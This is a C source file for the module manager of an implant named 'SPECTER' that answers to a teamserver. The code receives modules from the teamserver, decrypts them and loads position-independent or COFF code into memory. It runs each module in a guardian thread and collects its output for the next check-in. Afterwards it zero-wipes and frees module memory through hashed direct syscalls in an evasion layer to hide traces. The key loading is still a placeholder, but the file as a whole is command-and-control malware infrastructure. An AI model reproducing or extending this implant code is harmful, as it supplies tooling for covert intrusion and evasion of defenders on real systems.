/**
 * SPECTER Implant — Module Lifecycle Manager
 *
 * Manages the full module lifecycle:
 *   fetch → verify → decrypt → load → execute → wipe → report
 *
 * The MODULE_MANAGER holds up to 8 concurrent module slots, each with
 * its own LOADED_MODULE, OUTPUT_RING, and MODULE_BUS_API copy.
 *
 * Integration points:
 *   - Main check-in loop calls modmgr_execute() for LoadModule tasks
 *   - Before check-in, calls modmgr_poll() to drain output and collect
 *     crash info
 *   - Completed/crashed modules are cleaned up via modmgr_cleanup()
 */

#include "specter.h"
#include "ntdefs.h"
#include "bus.h"

#ifndef TEST_BUILD
#include "syscalls.h"
#include "evasion.h"
#include "crypto.h"
#endif

/* ------------------------------------------------------------------ */
/*  Static module manager instance                                      */
/* ------------------------------------------------------------------ */

static MODULE_MANAGER g_modmgr;

/* ------------------------------------------------------------------ */
/*  Helper: find a free module slot                                     */
/* ------------------------------------------------------------------ */

static int find_free_slot(MODULE_MANAGER *mgr) {
    for (DWORD i = 0; i < MODMGR_MAX_SLOTS; i++) {
        if (mgr->slots[i].status == MODULE_STATUS_WIPED ||
            (mgr->slots[i].memory_base == NULL &&
             mgr->slots[i].entry_point == NULL &&
             mgr->slots[i].module_id == 0))
            return (int)i;
    }
    return -1;
}

/* ------------------------------------------------------------------ */
/*  Helper: initialize per-module output ring and bus API               */
/* ------------------------------------------------------------------ */

static void init_slot_bus(MODULE_MANAGER *mgr, DWORD slot_idx) {
    /* Reset the per-module output ring */
    output_reset(&mgr->output_rings[slot_idx]);

    /* Copy the global bus API table into the per-slot copy so each
     * module gets its own output routing.  The output function pointer
     * is overridden to write to the per-module ring. */
    BUS_CONTEXT *bctx = NULL;
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)mgr->implant_ctx;
    if (ctx && ctx->module_bus) {
        bctx = (BUS_CONTEXT *)ctx->module_bus;
        spec_memcpy(&mgr->slot_apis[slot_idx], &bctx->api, sizeof(MODULE_BUS_API));
    } else {
        spec_memset(&mgr->slot_apis[slot_idx], 0, sizeof(MODULE_BUS_API));
    }

    /* Point module at its own output ring and bus API */
    mgr->slots[slot_idx].output_ring = &mgr->output_rings[slot_idx];
    mgr->slots[slot_idx].bus_api = &mgr->slot_apis[slot_idx];
}

/* ------------------------------------------------------------------ */
/*  modmgr_init                                                         */
/* ------------------------------------------------------------------ */

NTSTATUS modmgr_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    spec_memset(&g_modmgr, 0, sizeof(MODULE_MANAGER));
    g_modmgr.implant_ctx = ctx;
    g_modmgr.next_module_id = 1;
    g_modmgr.initialized = TRUE;

    /* Initialize all output rings */
    for (DWORD i = 0; i < MODMGR_MAX_SLOTS; i++) {
        output_reset(&g_modmgr.output_rings[i]);
    }

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  modmgr_execute — verify → decrypt → load → execute                 */
/* ------------------------------------------------------------------ */

int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len) {
    if (!mgr || !mgr->initialized || !package || len == 0)
        return -1;

    if (mgr->active_count >= MODMGR_MAX_SLOTS)
        return -1;

    /* Find a free slot */
    int slot_idx = find_free_slot(mgr);
    if (slot_idx < 0)
        return -1;

    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)mgr->implant_ctx;
    if (!ctx)
        return -1;

    /* 1. Parse and verify the package header */
    const MODULE_PACKAGE_HDR *hdr = loader_parse_header(package, len);
    if (!hdr)
        return -1;

#ifndef TEST_BUILD
    /* Verify Ed25519 signature using teamserver's signing key from config.
     * The signing key is expected in the implant config. For now, use a
     * placeholder — real config integration happens in Phase 06. */
    BYTE signing_key[32];
    spec_memset(signing_key, 0, 32);
    /* TODO: load signing key from ctx->config */

    if (!loader_verify_package(package, len, signing_key))
        return -1;
#endif

    /* 2. Decrypt the package */
    BYTE plaintext[MODULE_MAX_SIZE];
    DWORD plaintext_len = MODULE_MAX_SIZE;

#ifndef TEST_BUILD
    BYTE implant_privkey[32];
    spec_memset(implant_privkey, 0, 32);
    /* TODO: load private key from ctx->config */

    if (!loader_decrypt_package(package, len, implant_privkey, plaintext, &plaintext_len)) {
        spec_memset(plaintext, 0, sizeof(plaintext));
        return -1;
    }
#else
    /* TEST_BUILD: skip crypto, treat the data after the header as plaintext */
    const BYTE *payload = package + sizeof(MODULE_PACKAGE_HDR);
    plaintext_len = hdr->encrypted_size;
    if (plaintext_len > MODULE_MAX_SIZE) {
        return -1;
    }
    spec_memcpy(plaintext, payload, plaintext_len);
#endif

    /* 3. Initialize the slot's bus API and output ring */
    init_slot_bus(mgr, (DWORD)slot_idx);

    LOADED_MODULE *mod = &mgr->slots[slot_idx];
    spec_memset(mod, 0, sizeof(LOADED_MODULE));
    mod->module_id = mgr->next_module_id++;
    mod->output_ring = &mgr->output_rings[slot_idx];
    mod->bus_api = &mgr->slot_apis[slot_idx];
    mod->status = MODULE_STATUS_LOADING;

    /* 4. Load the module (PIC or COFF) */
    PVOID entry = NULL;
    if (hdr->module_type == MODULE_TYPE_PIC) {
        entry = loader_load_pic(plaintext, plaintext_len,
                                mod->bus_api, mod);
    } else if (hdr->module_type == MODULE_TYPE_COFF) {
        entry = loader_load_coff(plaintext, plaintext_len,
                                 mod->bus_api, mod);
    }

    /* Zero the plaintext buffer */
    spec_memset(plaintext, 0, plaintext_len);

    if (!entry) {
        spec_memset(mod, 0, sizeof(LOADED_MODULE));
        return -1;
    }

    /* 5. Execute in a guardian thread */
    if (!guardian_create(entry, mod->bus_api, mod)) {
        /* Failed to create guardian — clean up loaded module memory */
        if (mod->memory_base && mod->bus_api) {
            mod->bus_api->mem_protect(mod->memory_base, mod->memory_size,
                                      PAGE_READWRITE);
            spec_memset(mod->memory_base, 0, mod->memory_size);
            mod->bus_api->mem_free(mod->memory_base);
        }
        spec_memset(mod, 0, sizeof(LOADED_MODULE));
        return -1;
    }

    mgr->active_count++;
    return slot_idx;
}

/* ------------------------------------------------------------------ */
/*  modmgr_poll — check modules, drain output, collect results         */
/* ------------------------------------------------------------------ */

DWORD modmgr_poll(MODULE_MANAGER *mgr, BYTE *results_out, DWORD *results_len) {
    if (!mgr || !mgr->initialized)
        return 0;

    DWORD finished_count = 0;
    DWORD write_offset = 0;
    DWORD capacity = (results_out && results_len) ? *results_len : 0;

    for (DWORD i = 0; i < MODMGR_MAX_SLOTS; i++) {
        LOADED_MODULE *mod = &mgr->slots[i];

        /* Skip empty/wiped slots */
        if (mod->module_id == 0 || mod->status == MODULE_STATUS_WIPED)
            continue;

        /* Check if guardian thread completed (non-blocking) */
        if (mod->status == MODULE_STATUS_RUNNING) {
            guardian_wait(mod, 0);  /* 0 = poll, don't block */
        }

        /* Drain output from completed or crashed modules */
        if (mod->status == MODULE_STATUS_COMPLETED ||
            mod->status == MODULE_STATUS_CRASHED) {

            if (mod->output_ring && results_out && capacity > write_offset) {
                /* Write a small header: [4B module_id][4B status][4B output_len] */
                DWORD hdr_size = 12; /* 3 x DWORD */
                DWORD max_output = capacity - write_offset;

                if (max_output > hdr_size) {
                    /* Drain output into results buffer after header */
                    DWORD drained = output_drain(mod->output_ring,
                                                  results_out + write_offset + hdr_size,
                                                  max_output - hdr_size);

                    /* Write header */
                    BYTE *hdr_ptr = results_out + write_offset;
                    spec_memcpy(hdr_ptr, &mod->module_id, 4);
                    spec_memcpy(hdr_ptr + 4, &mod->status, 4);
                    spec_memcpy(hdr_ptr + 8, &drained, 4);

                    write_offset += hdr_size + drained;
                }
            }

            finished_count++;

            /* Auto-cleanup completed/crashed modules */
            modmgr_cleanup(mgr, i);
        }
    }

    if (results_len)
        *results_len = write_offset;

    return finished_count;
}

/* ------------------------------------------------------------------ */
/*  modmgr_cleanup — securely wipe a module slot                       */
/* ------------------------------------------------------------------ */

void modmgr_cleanup(MODULE_MANAGER *mgr, DWORD slot) {
    if (!mgr || slot >= MODMGR_MAX_SLOTS)
        return;

    LOADED_MODULE *mod = &mgr->slots[slot];
    if (mod->module_id == 0)
        return;

    /* Step 1: If module memory is allocated, flip to RW, zero-fill,
     *         then free (decommit + release) */
    if (mod->memory_base && mod->memory_size > 0) {
#ifndef TEST_BUILD
        IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)mgr->implant_ctx;
        if (ctx && ctx->evasion_ctx) {
            /* Flip to RW so we can zero-fill */
            PVOID base = mod->memory_base;
            SIZE_T size = mod->memory_size;
            ULONG old_prot;
            evasion_syscall((EVASION_CONTEXT *)ctx->evasion_ctx,
                HASH_NTPROTECTVIRTUALMEMORY,
                (HANDLE)-1, &base, &size,
                (ULONG)PAGE_READWRITE, &old_prot);

            /* Zero-fill the module memory */
            spec_memset(mod->memory_base, 0, mod->memory_size);

            /* Free (decommit + release) */
            base = mod->memory_base;
            size = 0;
            evasion_syscall((EVASION_CONTEXT *)ctx->evasion_ctx,
                HASH_NTFREEVIRTUALMEMORY,
                (HANDLE)-1, &base, &size, (ULONG)MEM_RELEASE);
        }
#else
        /* TEST_BUILD: just zero the tracking (no real memory to free) */
        (void)0;
#endif
    }

    /* Step 2: Zero the output ring for this slot */
    spec_memset(&mgr->output_rings[slot], 0, sizeof(OUTPUT_RING));

    /* Step 3: Zero the bus API copy for this slot */
    spec_memset(&mgr->slot_apis[slot], 0, sizeof(MODULE_BUS_API));

    /* Step 4: Mark slot as wiped and zero the module structure */
    spec_memset(mod, 0, sizeof(LOADED_MODULE));
    mod->status = MODULE_STATUS_WIPED;

    /* Decrement active count */
    if (mgr->active_count > 0)
        mgr->active_count--;
}

/* ------------------------------------------------------------------ */
/*  modmgr_shutdown — kill all active modules and clean up              */
/* ------------------------------------------------------------------ */

void modmgr_shutdown(MODULE_MANAGER *mgr) {
    if (!mgr || !mgr->initialized)
        return;

    for (DWORD i = 0; i < MODMGR_MAX_SLOTS; i++) {
        LOADED_MODULE *mod = &mgr->slots[i];
        if (mod->module_id == 0 || mod->status == MODULE_STATUS_WIPED)
            continue;

        /* Kill running modules */
        if (mod->status == MODULE_STATUS_RUNNING ||
            mod->status == MODULE_STATUS_LOADING) {
            guardian_kill(mod);
        }

        /* Clean up the slot */
        modmgr_cleanup(mgr, i);
    }

    mgr->initialized = FALSE;
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
MODULE_MANAGER *modmgr_test_get_manager(void) {
    return &g_modmgr;
}
#endif
